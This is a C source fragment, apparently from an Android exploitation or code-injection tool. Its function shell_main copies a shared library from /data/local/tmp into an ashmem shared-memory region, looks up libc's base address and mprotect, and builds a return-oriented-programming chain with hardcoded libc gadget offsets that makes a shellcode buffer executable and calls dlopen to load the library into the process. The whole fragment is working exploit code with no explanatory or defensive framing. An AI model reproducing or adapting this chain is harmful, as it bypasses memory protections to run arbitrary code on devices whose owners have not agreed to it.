void shell_main(){

    dlopen_t dlopen_f = (dlopen_t)getProcAddr(NULL,"dlopen");
    dlsym_t dlsym_f = (dlsym_t)getProcAddr(NULL,"dlsym");

    const char *so_name = "/data/local/tmp/testso.so";
    char *code = (char*)get_so_buffer(so_name); 
    int ashmem_len = *(int*)code;
    int fd_memory = ashmem_create_region("shmem", ashmem_len);
    ashmem_pin_region(fd_memory, 0, 0);
    uint8_t *shm = (uint8_t*)mmap(NULL, ashmem_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_memory, 0);
    printf("first map address is %p\n",shm);
    memcpy(shm,code,ashmem_len);
    free(code);
    //ashmem_unpin_region(fd_memory, 0, 0);

    int pos[32]={12,2,12,fd_memory};
    //shellcode(dlopen_f,pos);
    uint32_t libcbase = (uint32_t)getModuleBase("libc.so");
    uint32_t mprotect_address = (uint32_t)getProcAddr("libc.so","mprotect");
    uint32_t len = 0;
    void *buffer = get_shellcode(&len);
    uint32_t ropData[29]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,(uint32_t)buffer&0xfffff000,4096,0x7,(uint32_t)mprotect_address,(uint32_t)dlopen_f,(uint32_t)pos,2,(uint32_t)buffer+1};
    //uint32_t ropData[29]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,(uint32_t)buffer&0xfffff000,4096,0x7,(uint32_t)mprotect_address,(uint32_t)dlopen_f,1,2,(uint32_t)shellcode};
    asmm_test((uint32_t)ropData);
    free(buffer);
    exit(-1);
}